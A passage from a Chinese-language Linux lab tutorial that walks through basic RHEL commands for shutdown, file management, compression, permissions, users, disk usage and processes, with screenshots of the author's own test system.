<div class="tabs" id="shutdown_and_restart"><ul class="nav-tabs"><li class="tab active"><a href="#shutdown_and_restart-1">立即关机 - h</a></li><li class="tab"><a href="#shutdown_and_restart-2">立即重启 - r</a></li><li class="tab"><a href="#shutdown_and_restart-3">延时关机</a></li><li class="tab"><a href="#shutdown_and_restart-4">取消延时关机</a></li><li class="tab"><a href="#shutdown_and_restart-5">后台提醒重启</a></li><li class="tab"><a href="#shutdown_and_restart-6">警告提示次数</a></li></ul><div class="tab-content"><div class="tab-pane active" id="shutdown_and_restart-1"><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">shutdown now</span><br><span class="line">shutdown -h now</span><br></pre></td></tr></tbody></table></figure>
<div class="note info"><p>除了 <code>shutdown</code> 以外，<code>halt</code>、<code>poweroff</code>、<code>init 0</code> 也可以关机。</p>
</div></div><div class="tab-pane" id="shutdown_and_restart-2"><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">shutdown -r now</span><br></pre></td></tr></tbody></table></figure>
<div class="note info"><p><code>init 6</code> 也可以重启。</p>
</div></div><div class="tab-pane" id="shutdown_and_restart-3"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/4-1.png" class="">
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">shutdown [offset] [message]</span><br></pre></td></tr></tbody></table></figure>
<div class="note warning"><p>注意提示为 The system is going down for <mark class="label warning">power-off</mark>…</p>
</div></div><div class="tab-pane" id="shutdown_and_restart-4"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/4-2.png" class="">
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">shutdown -c</span><br></pre></td></tr></tbody></table></figure>
<div class="note warning"><p>注意提示 The system shutdown<br>
<mark class="label warning">has been cancelled</mark> …</p>
</div></div><div class="tab-pane" id="shutdown_and_restart-5"><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">shutdown -r [time] [isBackground]</span><br></pre></td></tr></tbody></table></figure>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/4-3.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/4-4.png" class=""></div></div></div>
<div class="note info"><ul>
<li><code>&amp;</code> 表示将当前命令放在后台运行，命令行中可能还要做一些工作。（防止终端被卡住）</li>
<li><code>-r</code> 表示 reboot，重启系统。</li>
</ul>
</div> 
<div class="note warning"><p>注意提示是 The system is going down for <mark class="label warning">reboot</mark> …</p>
<p>此时如果打开其他终端，重启警告信息会一分钟发送一次。</p>
</div></div><div class="tab-pane" id="shutdown_and_restart-6"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/4-5.png" class="">
<div class="note info"><p><code>-k &lt;int&gt;</code> 表示警告信息提示次数，提示完毕后，系统将关机。警告信息提示频率默认为 1 分钟 1 次。</p>
</div></div></div></div></div><div class="tab-pane" id="linux-commands-2"><div class="tabs" id="files"><ul class="nav-tabs"><li class="tab active"><a href="#files-1">ls</a></li><li class="tab"><a href="#files-2">cp/mv</a></li><li class="tab"><a href="#files-3">rm</a></li><li class="tab"><a href="#files-4">mkdir</a></li><li class="tab"><a href="#files-5">rmdir</a></li><li class="tab"><a href="#files-6">cd 和 pwd</a></li><li class="tab"><a href="#files-7">cat</a></li><li class="tab"><a href="#files-8">find</a></li><li class="tab"><a href="#files-9">grep</a></li><li class="tab"><a href="#files-10">more</a></li></ul><div class="tab-content"><div class="tab-pane active" id="files-1"><div class="note primary"><p>格式：<code>ls [option] [path]</code></p>
<p>ls 命令一般用于列出 Linux 中文件夹下的文件列表。</p>
</div>
<div class="tabs" id="ls"><ul class="nav-tabs"><li class="tab active"><a href="#ls-1">默认情况</a></li><li class="tab"><a href="#ls-2">-l 参数</a></li><li class="tab"><a href="#ls-3">-d 参数</a></li><li class="tab"><a href="#ls-4">-a 参数</a></li></ul><div class="tab-content"><div class="tab-pane active" id="ls-1"><p><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-0.png" class=""> 在任何参数都不加的情况下，输出当前目录的非隐藏文件列表。</p></div><div class="tab-pane" id="ls-2"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-1.png" class="">
<p><code>-l</code><br>
参数使得输出结果以列表形式展示。最上端的 “总用量” 代表当前目录下所有文件所占用的空间总和，下方输出，从左到右分别代表文件属性（文件类型 + 权限属性）、硬链接数（指向该文件的链接数）、文件（目录）拥有者、文件（目录）拥有者所在的用户组、文件所占用的空间（以字节为单位）、文件（目录）最近访问（修改）时间、文件名（如果是一个符号链接，那么会有一个 “→” 箭头符号，后面跟一个它指向的文件名）。</p></div><div class="tab-pane" id="ls-3"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-2.png" class="">
<p><code>-d</code> 参数代表只显示目录。</p></div><div class="tab-pane" id="ls-4"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-3.png" class="">
<p><code>-a</code> 表示显示隐藏文件，在 Linux 系统下，认为以英文句点 (.) 开头的文件名为隐藏文件。</p>
<div class="note info"><ul>
<li><code>..</code> 和<code>.</code> 是特殊的隐藏文件，分别代表上级目录和本级目录。</li>
<li><code>-s</code> 代表显示各个文件的大小，后面的 <code>-S</code> 代表以文件大小对输出结果排序。</li>
<li>Linux 系统下，认为每一个目录 “大小” 为 4kb。</li>
</ul>
</div></div></div></div></div><div class="tab-pane" id="files-2"><div class="note primary"><p>格式：<code>[cp/mv] [option] [pathfrom] [pathto]</code><br>
cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件或目录，也可以用于重命名。</p>
</div> 
<div class="note default"><p>在实验准备之前，先在 data 目录下写一个 1.txt 文件，内容为 "welcome to linux!"。</p>
</div>
<div class="tabs" id="mv_and_cp"><ul class="nav-tabs"><li class="tab active"><a href="#mv_and_cp-1">复制</a></li><li class="tab"><a href="#mv_and_cp-2">移动</a></li><li class="tab"><a href="#mv_and_cp-3">-i 和 - r 参数</a></li></ul><div class="tab-content"><div class="tab-pane active" id="mv_and_cp-1"><p>把它复制到同一个目录下 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-5.png" class=""></p></div><div class="tab-pane" id="mv_and_cp-2"><p>把它移动到文件夹 a 下面 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-6.png" class=""></p></div><div class="tab-pane" id="mv_and_cp-3"><p>要把上一步的文件复制到另一个文件夹下<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-7.png" class=""><br>
-i 表示交互提示 (interactive)，在覆盖文件前会弹出提示。</p>
<div class="note warning"><p>现在我们看到直接复制文件夹是不行的。<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-8.png" class=""><br>
此时需要 - r 参数，表示递归复制文件夹下的所有内容 (recursive)。<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-9.png" class=""></p>
</div></div></div></div></div><div class="tab-pane" id="files-3"><div class="note primary"><p>格式：<code>rm [option] [dirname|filename]</code></p>
<p><code>rm</code> 命令一般用于删除文件或目录。</p>
</div> 
<div class="note primary"><p>实验环境在 <code>/root/data</code> 文件夹下，文件列表如第一条命令执行结果所示。</p>
</div>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-10.png" class=""> 
<p>可以看到，直接 <code>rm</code> 目录名是无法删掉目录的（加上 <code>-d</code> 选项也只能移除空的目录），而 <code>rm</code> 文件名是可以删除文件的（权限足够的情况下）。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-11.png" class=""> 
<p>删除目录要用 <code>-r</code> 选项，实际上，它递归移除了其中的所有文件 (recursive)。从上图中也可以看到，目录名、文件名都支持通配符。</p>
<p><code>-f</code> 表示强制删除 (force)，没有任何提示。删除文件夹时一般与 <code>-r</code> 参数配合，以省掉频繁的确认过程。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-12.png" class=""></div><div class="tab-pane" id="files-4"><div class="note primary"><p>格式：<code>mkdir [option] [dirname]</code></p>
<p><code>mkdir</code> 命令一般用于创建目录。</p>
</div>
<div class="note primary"><p>在进行下一步操作前，<code>data</code> 文件夹为空</p>
</div>
<p>在当前目录下直接创建 a、b、c 文件夹 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-13.png" class=""></p>
<p>试图用同样方法在 <code>a</code> 文件夹下建立 <code>test/t</code>1 两级目录。嗯？不行？创建多级目录时，最好使用 <code>-p</code> 选项，建立必要的父文件夹结构。下右图为创建效果</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-14.png" class=""> <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-15.png" class="">
<p><code>-m</code> 指定了当前文件夹的权限属性。这回就涉及到了 <code>ls -l</code> 命令输出的左侧的第一个字段了。实际上，<code>r:read</code> 就是读权限，用数字 4 表示，<code>w:write</code> 就是写权限，用数字 2 表示，<code>x:excute</code> 就是执行权限，用数字 1 表示。第一组 <code>rwx</code> 表示文件拥有者权限，第二组 <code>rwx</code> 表示与拥有者同用户组的权限，最后一组表示其他用户权限。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-16.png" class=""> 
<div class="note success"><p>例如，用于 ssh 登录的 <code>authorized_keys</code> 文件的权限值为 600，只允许当前用户的写和读权限，其他用户没有任何权限，这样做是出于安全的考虑。</p>
</div></div><div class="tab-pane" id="files-5"><div class="note primary"><p>格式：<code>rmdir [option] [dirname]</code></p>
<p><code>rmdir</code> 命令一般用于删除空目录。和 <code>rm -d</code> 的作用效果一致</p>
</div> 
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-17.png" class=""></div><div class="tab-pane" id="files-6"><div class="note primary"><p>格式：<code>cd [option] dirname</code></p>
<p><code>cd</code> 用于改变当前工作路径，影响后续命令的执行路径 (change directory)。<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-18.png" class=""></p>
<p><code>pwd [option]</code></p>
<p><code>pwd</code> 用于打印出当前工作路径 (print working directory)<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-19.png" class=""></p>
</div></div><div class="tab-pane" id="files-7"><div class="note primary"><p>格式：<code>cat [option] file ... </code></p>
<p><code>cat</code> 命令一般用于拼接 (concatenate) 文件或标准输入，并在标准输出中输出结果。</p>
</div>
<details class="note info no-icon"><summary><p>例子</p>
</summary>
<p>例如：<code>t1</code> 文件夹下有 <code>a.txt</code>，<code>b.txt</code> 文件，现在要把它们打印在控制台上（“直接打开”），结果如下<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-20.png" class=""><br>
其中 <code>-b</code> 选项表示输出非空行的行号。</p>
<p>也可以将标准输入重定向至文件中，使用 <code>&gt;</code> 符号。使用<kbd> ctrl</kbd>+<kbd>c</kbd> 退出重定向模式。<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-21.png" class=""></p>
<p>或者将两个文件的内容拼在一起，然后把输出结果重定向至第三个文件中。<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-22.png" class=""></p>
</details></div><div class="tab-pane" id="files-8"><div class="note primary"><p>格式：<code>find [dir]... [option]</code></p>
<p><code>find</code> 命令一般用于查找文件。一般有 <code>-name</code> 和 <code>-type</code> 两种选项</p>
</div> 
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-23.png" class="">
<p><code>-print</code> 用于打印出所有查找结果。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-24.png" class=""></p>
<p><code>-user</code> 用于指定查找的用户范围。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-25.png" class=""></p>
<p><code>-exec &lt;command&gt; {} \;</code> 用于将查找到的文件执行 command 命令，比如以下截图命令为删除空文件（大小为 0 的文件）。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-26.png" class=""> 
<div class="note warning"><p>注意：大括号和反斜杠之间有一个空格</p>
</div></div><div class="tab-pane" id="files-9"><div class="note primary"><p>格式：<code>grep [option] [pattern] [file]</code></p>
<p><code>grep</code> 命令用于从文件中查找给定格式的字符串并打印出来。</p>
</div> 
<p>从下图的演示结果来看，<code>-i</code> 选项为忽略大小写的查找（用例文本没写出这一点来），<code>-n</code> 开启了行号显示。对于查找大文件的相关字符串有一定帮助。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-27.png" class=""></div><div class="tab-pane" id="files-10"><div class="note primary"><p>格式：<code>more [option] file [...]</code></p>
<p>用于分页显示大文件。类似于 <code>cat</code>。</p>
</div> 
<p>在分页显示模式中，按<kbd> Space</kbd> 可以前进一页，<kbd>Backspace</kbd> 可以后退一页，<kbd>q</kbd> 键退出此模式。模式截图如下。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-28.png" class="">
<p><code>more</code> 还可以和其他命令配合使用，比如要列出一个目录下的文件，由于内容太多，我们应该用 <code>more</code> 来分页显示</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /usr/lib | more</span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/5-29.png" class=""></div></div></div></div><div class="tab-pane" id="linux-commands-3"><div class="tabs" id="zipping"><ul class="nav-tabs"><li class="tab active"><a href="#zipping-1">tar</a></li><li class="tab"><a href="#zipping-2">gzip/unzip</a></li></ul><div class="tab-content"><div class="tab-pane active" id="zipping-1"><ul>
<li><code>-c</code> 创建新的压缩文件</li>
<li><code>-v</code> 显示详细的处理信息</li>
<li><code>-f</code> 要操作的文件名，这里是所有 txt 文件</li>
<li>会打包成 <code>tar</code> 格式 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/6-1.png" class=""></li>
</ul>
<div class="note info"><h4 id="怎么生成文件大小反而更大了？">怎么生成文件大小反而更大了？</h4>
<p>还得调用 <code>-z</code> 参数！（实际调用了 gzip 程序进行压缩）生成的<code>.tar.gz</code> 文件体积果然减小了。<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/6-2.png" class=""></p>
</div>
<ul>
<li><code>-x</code> 选项用于解压 (extract) 文件</li>
<li><code>tar</code> 文件至少要用 <code>-xf</code> 选项，<code>tar.gz</code> 文件至少要用 <code>-zxf</code> 选项。<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/6-3.png" class=""></li>
</ul></div><div class="tab-pane" id="zipping-2"><p><code>gzip</code> 命令主要用于 <code>gz</code> 格式的压缩。</p>
<p><code>--best</code> 指以最高压缩比进行压缩（也可以用 <code>-9</code> 来指定），同时，有以最快速度进行压缩的选项，为 <code>--fast</code> 或 <code>-1</code>。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/6-4.png" class=""></p>
<p><code>-l</code> 查看当前所有 <code>gz</code> 压缩文件的信息（包括压缩前后大小，压缩比，原文件名） <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/6-5.png" class=""></p>
<p><code>-d</code> 选项可以解压 <code>gz</code> 格式的压缩文件。在这里可以验证原来文本文件的大小。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/6-6.png" class=""></p>
<p><code>unzip</code> 主要用于 <code>zip</code> 格式压缩文件的解压。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/6-7.png" class=""></p>
<p><code>-d</code> 选项可以指定解压至哪一个文件夹。而 <code>unzip</code> 的默认处理方式为 <code>-j</code>，即直接解压至压缩包同级目录下。注意到 <code>inflating</code> 的输出有所不同。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/6-8.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/6-9.png" class=""></div></div></div></div></div></div></div><div class="tab-pane" id="linux-commands-4"><div class="tabs" id="linux_system_manage"><ul class="nav-tabs"><li class="tab active"><a href="#linux_system_manage-1">文件权限</a></li><li class="tab"><a href="#linux_system_manage-2">用户权限</a></li><li class="tab"><a href="#linux_system_manage-3">系统使用交互</a></li><li class="tab"><a href="#linux_system_manage-4">磁盘管理</a></li><li class="tab"><a href="#linux_system_manage-5">进程管理</a></li></ul><div class="tab-content"><div class="tab-pane active" id="linux_system_manage-1"><div class="tabs" id="sysman"><ul class="nav-tabs"><li class="tab active"><a href="#sysman-1">chmod</a></li><li class="tab"><a href="#sysman-2">chgrp</a></li><li class="tab"><a href="#sysman-3">chown</a></li></ul><div class="tab-content"><div class="tab-pane active" id="sysman-1"><div class="note primary"><p>格式：<code>chmod [who] [操作符] [mode] 文件名</code></p>
<p><code>chmod</code> 用于修改文件的权限标志位。</p>
</div>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/7-1.png" class="" title="为方便测试执行权限，my_ls文件中的内容是：ls ~">
<div class="note info"><p>who 选项中，g 指同组用户 (group)，o 指其他用户 (others)，u 指当前用户 (user)，a 指所有人 (all=g+o+u)。<br>
操作符 +/-/= 分别代表增加权限、减少权限、设定权限为，mode 为 rwx 三种，分别对应读取，写入，执行权限。</p>
<p><mark class="label info">新创建的文件一般没有执行权限，需要 <code>chmod +x</code> 来添加权限，</mark>然后在可执行文件所在文件夹下运行。<mark class="label primary">这一点似乎 root 用户也不例外。</mark></p>
</div>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/7-2.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/7-3.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/7-4.png" class=""></div></div></div>
<p>登录另一个用户尝试读、写、执行，发现均显示 “权限不够”，证明文件权限被正确设置为 <code>600</code>，即其他用户没有任何权限。</p>
<p>同理，也可以使用八进制掩码来设置文件权限，其中 r 的权值为 4，w 的权值为 2，x 的权值为 1，分别对应了读、写、执行权限。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/7-5.png" class=""></p></div><div class="tab-pane" id="sysman-2"><div class="note primary"><p>格式：<code>chgrp [username] [file]</code></p>
<p><code>chgrp</code> 用于更改文件所属的用户组。</p>
</div> 
<p>执行后发现 <code>ls -l</code> 的第四列结果（文件所属用户组）发生变化。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/7-6.png" class=""></p></div><div class="tab-pane" id="sysman-3"><div class="note primary"><p>格式：<code>chown [options] user[:group] file...</code></p>
<p><code>chown</code> 用于更改文件属主（和用户组）。</p>
</div>
执行后根据 `group` 的指定与否，发现 `ls -l` 结果的第三列或第三列和第四列发生变化
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/7-7.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/7-8.png" class=""></div></div></div></div></div></div></div><div class="tab-pane" id="linux_system_manage-2"><div class="tabs" id="user"><ul class="nav-tabs"><li class="tab active"><a href="#user-1">passwd</a></li><li class="tab"><a href="#user-2">su</a></li></ul><div class="tab-content"><div class="tab-pane active" id="user-1"><div class="note primary"><p>格式：<code>passwd &lt;用户名&gt;</code></p>
<p><code>passwd</code> 命令用于更改一个用户的 unix 密码，在更改的过程中，发现它有一定的强度要求。<strong>而且输入的密码不会在屏幕上回显。</strong></p>
</div>
注销，用新用户登录，输入刚才设置的密码可以进入系统。
<p><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/8-1.png" class=""> <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/8-2.png" class=""></p>
<div class="note primary"><p>使用 <code>passwd -S &lt;用户名&gt;</code> 可以打印出目标用户的密码情况。嗯，SHA512 算法还是相对来说比较安全的…… <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/8-3.png" class=""></p>
</div>
`passwd -d &lt;用户名&gt;` 可以清除指定用户的密码。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/8-4.png" class=""></div><div class="tab-pane" id="user-2"><p><code>su &lt;用户名&gt;</code> 可以不注销当前登录态的情况下切换用户，视密码是否为空而提示输入相应用户密码。（当时 root 有密码，testusr 没有密码）</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/8-5.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/8-6.png" class=""></div></div></div></div></div></div></div><div class="tab-pane" id="linux_system_manage-3"><div class="tabs" id="sys_interact"><ul class="nav-tabs"><li class="tab active"><a href="#sys_interact-1">write</a></li><li class="tab"><a href="#sys_interact-2">mesg</a></li></ul><div class="tab-content"><div class="tab-pane active" id="sys_interact-1"><p>write 命令用于传讯息给其他使用者。在执行 write 用户名 后，把要传输的信息打过去，按<kbd> ctrl</kbd>+<kbd>c</kbd> 结束，传输的信息就会显示在那个用户名的终端里。 在这里，我使用了本地的另一台虚拟机 Kali Linux，以 ssh 方式访问 rhel 机器，来模拟多用户访问的情况。以下为测试效果。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/9-1.png" class="" title="传输给客户端信息"></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/9-2.png" class="" title="客户端登录"></div></div></div></div><div class="tab-pane" id="sys_interact-2"><p>使用 <code>mesg n</code> 可以关闭终端机的写入权限（实际上上图的情况是表明输出权限也一并被关闭）。<code>mesg y</code> 可以重新打开。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/9-3.png" class="" title="write命令"></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/9-4.png" class="" title="客户端效果"></div></div></div></div></div></div></div><div class="tab-pane" id="linux_system_manage-4"><div class="tabs" id="disk-man"><ul class="nav-tabs"><li class="tab active"><a href="#disk-man-1">free</a></li><li class="tab"><a href="#disk-man-2">df</a></li><li class="tab"><a href="#disk-man-3">du</a></li><li class="tab"><a href="#disk-man-4">dd</a></li><li class="tab"><a href="#disk-man-5">fdformat</a></li></ul><div class="tab-content"><div class="tab-pane active" id="disk-man-1"><p><code>free</code> 命令用于查看系统中已用空间和可用空间。表头从左到右的含义为总空间，已用空间，空余空间，共享空间，缓存空间，可用空间。第一行为存储区，第二行为交换区。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/10-0.png" class="">
<p><code>-b | -k | -m</code> 表示以字节，千字节，兆字节的方式来显示数据，可读性更强，不过要使可读性最强，可以使用 <code>-h</code> 选项。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/10-00.png" class=""></p></div><div class="tab-pane" id="disk-man-2"><p><code>df</code> 命令用于显示目前在 Linux 系统上的文件系统的磁盘使用情况统计。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/10-1.png" class=""></p>
<p><code>-a</code> 选项包含所有的具有 0 Blocks 的文件系统，<code>-T</code> 选项显示文件系统的形式。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/10-2.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/10-3.png" class=""></div></div></div>
<p><code>-t</code> 代表限制列出文件系统的类型，由于当前系统没有 <code>ext3</code> 格式的类型，所以会显示 “未处理文件系统”。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/10-4.png" class=""><br>
<code>-h</code> 使其中输出的值（指容量相关值）更加具有可读性。</p></div><div class="tab-pane" id="disk-man-3"><p><code>du</code> 命令用于显示目录或文件的大小。默认统计当前文件夹大小。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/10-5.png" class=""></p>
<p><code>du –a /</code> 的结果，输出很长，只截取了后面的部分，最底部的 “3283432” 为总用量，<code>-a</code> 选项则列出了所有文件及目录的大小 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/10-6.png" class=""></p>
<p><code>-s</code> 选项仅显示总计容量大小，配合 <code>-h</code> 选项可以快速统计某目录的所占空间大小。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/10-7.png" class=""></p></div><div class="tab-pane" id="disk-man-4"><p><code>dd</code> 命令用于以指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。经常用于备份设备数据。</p>
<p>由于设备短缺，测试只好使用从文件复制到本地硬盘中。可以看到一些输出。</p>
<p>直接运行 <code>dd</code> 命令是从标准输入传送到标准输出。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/11-1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/11-2.png" class=""></div></div></div></div><div class="tab-pane" id="disk-man-5"><p><code>fdformat</code> 主要用于低阶格式化软盘，对设备要求较高，由于手边设备有限，并不能得出结果。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/12.png" class=""></p></div></div></div></div><div class="tab-pane" id="linux_system_manage-5"><div class="tabs" id="process_man"><ul class="nav-tabs"><li class="tab active"><a href="#process_man-1">at</a></li><li class="tab"><a href="#process_man-2">bg、fg 和 &amp;</a></li><li class="tab"><a href="#process_man-3">who</a></li><li class="tab"><a href="#process_man-4">w</a></li><li class="tab"><a href="#process_man-5">ps</a></li><li class="tab"><a href="#process_man-6">kill</a></li></ul><div class="tab-content"><div class="tab-pane active" id="process_man-1"><p><code>at</code> 命令：用于安排临时任务（与周期性任务 <code>crontab</code> 有所不同）</p>
<p>输入 <code>at &lt;time&gt;</code> 后，进入 at 命令模式，以<kbd> ctrl</kbd>+<kbd>D</kbd> 结束任务输入。</p>
<p><code>atq</code> 可以用于查看当前任务列表，<code>atrm &lt;id&gt;</code> 可以删除临时任务</p>
<p><img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/13-1.png" class=""> <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/13-2.png" class=""></p>
<p>比如，上图描述了在 14：45 分时，列出用户家目录的文件列表，并把它放入 <code>1.txt</code> 文件中。执行效果如下 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/13-3.png" class=""></p></div><div class="tab-pane" id="process_man-2"><p>命令执行通常会阻塞住当前的终端，如果命令执行时间很长，而碰巧又想执行别的命令，就会相当麻烦，<code>&amp;</code> 可以是当前命令转入后台运行，即使关闭当前终端也不会中断其运行。可以使用 <code>bg</code> 查看后台任务，<code>fg</code> 将后台任务转回终端查看。</p>
<div class="note info"><p>这里，<code>my_ls</code> 添加了 <code>sleep</code> 语句，方便查看后台运行效果</p>
</div>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/13-4.png" class=""></div><div class="tab-pane" id="process_man-3"><p><code>who</code> 命令显示关于当前在本地系统上的所有用户的信息。显示以下内容：登录名、tty、登录日期和时间，如果用户是从一个远程机器登录的，那么该机器的主机名也会被显示出来。</p>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-1.png" class="">
`-H` 显示表头，`-T` 显示 tty 的状态。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-2.png" class=""></div><div class="tab-pane" id="process_man-4"><p><code>w</code> 命令显示目前登入系统的用户信息。执行这项指令可得知目前登入系统的用户有哪些人，以及他们正在执行的程序。（<code>testusr</code> 没登录，所以这里没有他的信息）<br>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-3.png" class=""> <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-4.png" class=""></p></div><div class="tab-pane" id="process_man-5"><p><code>ps</code> 命令列出系统中当前运行的那些进程，是当前那些进程的快照。</p>
<blockquote><p>STAT 字母表示：</p>
<ul>
<li>R 运行 runnable (on run queue)</li>
<li>S 中断 sleeping</li>
<li>D 不可中断 uninterruptible sleep (usually IO)</li>
<li>T 停止 traced or stopped</li>
<li>Z 僵死 a defunct (‘zombie’) process</li>
</ul>
</blockquote>
<img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-5.png" class="">
<p><code>-u</code> 选择用户名。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-6.png" class=""></p>
<p><code>-l</code> 长格式。多了 F，wchan，C 等字段。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-7.png" class=""></p>
<p><code>-a</code> 显示一个终端的所有进程，除了会话引线。 <img data-src="/2019/09/26/experiments/oskernel/using-rhel-and-gcc/14-8.png" class=""></p>
<p><code>-x</code> 显示没有控制终端的进程，同时显示各个命令的具体路径。最常见的组合为 <code>-aux</code>，通常配合管道 <code>grep</code> 来找到要停止的进程。</p>
